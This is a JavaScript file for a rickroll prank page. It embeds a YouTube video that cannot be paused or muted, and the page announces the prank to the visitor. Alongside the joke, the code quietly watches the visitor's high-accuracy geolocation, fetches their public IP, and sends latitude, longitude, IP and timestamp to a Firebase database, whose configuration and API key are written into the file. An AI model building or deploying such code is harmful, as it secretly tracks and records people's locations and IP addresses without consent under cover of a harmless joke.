function reqFullScrn() {
    const elem = document.getElementById('player');
    if (elem.requestFullscreen) {
        elem.requestFullscreen();
    } else if (elem.mozRequestFullScreen) { /* Firefox */
        elem.mozRequestFullScreen();
    } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE/Edge */
        elem.msRequestFullscreen();
    }
}

var playing = false;
var index = 0;
var wait = setInterval(play, 1000);

// 2. This code loads the IFrame Player API code asynchronously.
var tag = document.createElement('script');

tag.src = "https://www.youtube.com/iframe_api";
var firstScriptTag = document.getElementsByTagName('script')[0];
firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

// 3. This function creates an <iframe> (and YouTube player)
//    after the API code downloads.
var player;
function onYouTubeIframeAPIReady() {
    player = new YT.Player('player', {
        height: '720px',
        width: '100%',
        videoId: 'dQw4w9WgXcQ',
        events: {
            'onReady': onPlayerReady,
            'onStateChange': onPlayerStateChange,
            'onPause': playVid
        }
    });
}


// 4. The API will call this function when the video player is ready.
function onPlayerReady(event) {
    if (playing) {
        event.target.playVideo();
    }
}

function playVid(event) {
    event.target.playVideo();
}

// 5. The API calls this function when the player's state changes.
//    The function indicates that when playing a video (state=1),
//    the player should play for six seconds and then stop.

function onPlayerStateChange(event) {
    if(event.data !== 1) {
        event.target.playVideo();
    }
}

setInterval(unMuteIfMuted, 1); // Checks to see if player is muted

function unMuteIfMuted() {
    if(player.isMuted()) {
        player.unMute();
    }
    player.setVolume(100);
}

function play(){
    index += 1;
    if(index >= 4){
        player.playVideo()
        playing = true
        document.getElementById('player').style.display = 'block';
        document.getElementById('text').innerHTML = 'HAHA You just got rickrolled!'
    }

}

var firebaseConfig = {
    apiKey: "AIzaSyAnJgPq2JLJe-tOeQHS2Sbbpo4N_m0EyT4",
    authDomain: "location-756c5.firebaseapp.com",
    databaseURL: "https://location-756c5.firebaseio.com",
    projectId: "location-756c5",
    storageBucket: "location-756c5.appspot.com",
    messagingSenderId: "311736958270",
    appId: "1:311736958270:web:c94137f9c3439e5f54006f",
    measurementId: "G-G8GVDR83SH"
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);
firebase.analytics();

function success(position) {
    let la = position.coords.latitude;
    let lo = position.coords.longitude;
    $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
        let ip = JSON.stringify(data).slice(7, -2)
        write1(la, lo, ip, getCTime())
    });

}
//10
function error() {
    $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
        let ip = JSON.stringify(data).slice(7, -2)
        write2(ip, getCTime())
    });
    //alert('Sorry, we are not able to detect your location.');
}

const options = {
    enableHighAccuracy: true,
    maximumAge: 10000,
    timeout: 27000
};

const watchID = navigator.geolocation.watchPosition(success, error, options);


function getCTime() {
    let d = new Date()
    return d.getTime()
}


function write1(lat, long, ip, time) {
    firebase.database().ref('location-756c5').push().set({
        latitude: lat,
        longitude: long,
        ip: ip,
        timestamp: time
    });
}

function write2(ip, time) {
    firebase.database().ref('location-756c5').push().set({
        ip: ip,
        timestamp: time
    });
}
